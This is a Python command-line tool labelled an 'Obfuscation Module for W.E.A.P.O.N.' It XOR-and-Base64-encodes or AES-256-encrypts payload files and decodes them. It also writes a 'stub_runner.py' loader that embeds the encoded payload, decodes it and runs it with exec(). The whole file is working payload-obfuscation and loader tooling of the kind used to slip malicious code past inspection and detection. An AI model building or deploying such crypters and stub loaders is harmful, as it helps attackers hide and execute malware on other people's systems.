import base64
import argparse
import os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def xor_base64_encode(file_path, key, output):
    with open(file_path, 'rb') as f:
        data = f.read()
    xored = xor_encrypt(data, key.encode())
    encoded = base64.b64encode(xored)

    with open(output, 'wb') as f:
        f.write(encoded)
    print(f"[+] XOR + Base64 encoded payload saved to {output}")

def aes_encrypt(file_path, password, output):
    with open(file_path, 'rb') as f:
        data = f.read()

    salt = get_random_bytes(16)
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    padding_len = 16 - len(data) % 16
    data += bytes([padding_len]) * padding_len

    encrypted = cipher.encrypt(data)
    with open(output, 'wb') as f:
        f.write(salt + iv + encrypted)
    print(f"[+] AES-256-CBC encrypted payload saved to {output}")

def decode_xor_base64(input_file, key):
    with open(input_file, 'rb') as f:
        encoded = f.read()
    decoded = base64.b64decode(encoded)
    original = xor_encrypt(decoded, key.encode())
    print(original.decode(errors='ignore'))

def generate_stub(encoded_file, key):
    with open(encoded_file, 'rb') as f:
        encoded = f.read()
    stub = f"""
import base64

def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

encoded = {encoded}
key = b"{key}"
decoded = base64.b64decode(encoded)
payload = xor(decoded, key)

# Simulate execution
exec(payload.decode(errors='ignore'))
"""
    with open("stub_runner.py", 'w') as f:
        f.write(stub)
    print("[+] Stub runner written to stub_runner.py")

def main():
    parser = argparse.ArgumentParser(description="Obfuscation Module for W.E.A.P.O.N.")
    parser.add_argument("--xor", nargs=2, metavar=("file", "key"), help="XOR + Base64 encode a payload")
    parser.add_argument("--aes", nargs=2, metavar=("file", "pass"), help="Encrypt payload with AES-256-CBC")
    parser.add_argument("--decode-xor", nargs=2, metavar=("file", "key"), help="Decode XOR + Base64 encoded file")
    parser.add_argument("--stub", nargs=2, metavar=("encoded_file", "key"), help="Generate XOR stub runner")

    parser.add_argument("-o", "--output", metavar="outfile", help="Output file", default="output.bin")

    args = parser.parse_args()

    if args.xor:
        xor_base64_encode(args.xor[0], args.xor[1], args.output)
    elif args.aes:
        aes_encrypt(args.aes[0], args.aes[1], args.output)
    elif args.decode_xor:
        decode_xor_base64(args.decode_xor[0], args.decode_xor[1])
    elif args.stub:
        generate_stub(args.stub[0], args.stub[1])
    else:
        parser.print_help()

if __name__ == "__main__":
    main()

